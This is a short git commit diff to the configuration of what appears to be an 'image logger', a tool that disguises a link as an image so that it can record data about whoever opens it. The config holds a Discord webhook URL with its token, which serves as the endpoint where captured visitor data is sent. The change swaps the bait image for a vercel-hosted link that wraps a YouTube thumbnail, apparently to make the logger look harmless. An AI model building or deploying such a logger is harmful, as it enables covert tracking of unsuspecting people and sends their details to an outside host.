2cfa47e5fa0ed35ddc01d967e96475ed2f3e1d12
Happypy74 <happydad74.gamiming@gmail.com>
2024-05-10 01:33:58 +0200

    Update main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1091987505957585026/DC3QJMjWQXXWFsDDHF5AZWBhmMjVgnUYOd3Y1tZmDHiYdbVLx2OZtZ72XV1dawdKGJom",
-    "image": "https://img.youtube.com/vi/__M0h9tHhNA/maxresdefault.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://secret-64q5ycz6l-mathys-projects-57368718.vercel.app/youtube.com?url=<https://img.youtube.com/vi/__M0h9tHhNA/maxresdefault.jpg>", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
